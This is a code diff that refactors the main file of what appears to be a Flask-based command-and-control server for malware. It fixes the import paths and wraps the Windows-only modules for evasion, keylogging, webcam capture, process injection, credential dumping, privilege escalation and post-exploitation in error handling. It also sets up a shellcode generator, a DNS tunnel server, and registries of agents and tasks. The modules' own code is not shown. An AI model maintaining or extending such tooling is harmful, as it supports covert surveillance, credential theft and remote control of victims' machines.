@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 import sys
 import os
 import platform
@@ -9,41 +9,37 @@ import logging
 from datetime import datetime
 import threading
 import requests
+from typing import Optional, Dict, List, Any
 
 from flask import Flask, render_template, request, jsonify
 
 # Fix: Add correct module path BEFORE importing
 MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), 'modules'))
-sys.path.append(MODULES_PATH)
+if MODULES_PATH not in sys.path:
+    sys.path.append(MODULES_PATH)
 
-from shellcode_generator import ShellcodeGenerator
-from modules.dns_tunnel import DNSTunnel
+from modules.shellcode_generator import ShellcodeGenerator
+from modules.dns_tunnel import create_server
 
 IS_WINDOWS = platform.system().lower() == "windows"
 if IS_WINDOWS:
-    from evasion import Evasion
-    from keylogger import Keylogger
-    from webcam import WebcamCapture
-    from process_injection import ProcessInjector
-    from credential_dump import CredentialDump
-    from priv_esc import PrivilegeEscalation
-    from post_exploit import PostExploit
+    try:
+        from evasion import Evasion
+        from keylogger import Keylogger
+        from webcam import WebcamCapture
+        from process_injection import ProcessInjector
+        from credential_dump import CredentialDump
+        from priv_esc import PrivilegeEscalation
+        from post_exploit import PostExploit
+    except ImportError as e:
+        logging.warning(f"Failed to import Windows-specific modules: {e}")
 
 # Logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 app = Flask(__name__)
 shellcode_gen = ShellcodeGenerator()
-dns_tunnel = DNSTunnel("example.com")
-
-if IS_WINDOWS:
-    evasion = Evasion()
-    keylogger = Keylogger()
-    webcam = WebcamCapture()
-    process_injector = ProcessInjector()
-    post_exploit = PostExploit()
-    cred_dump = CredentialDump()
-    priv_esc = PrivilegeEscalation()
+dns_tunnel = create_server("example.com")
 
 agents = {}
 tasks = {}
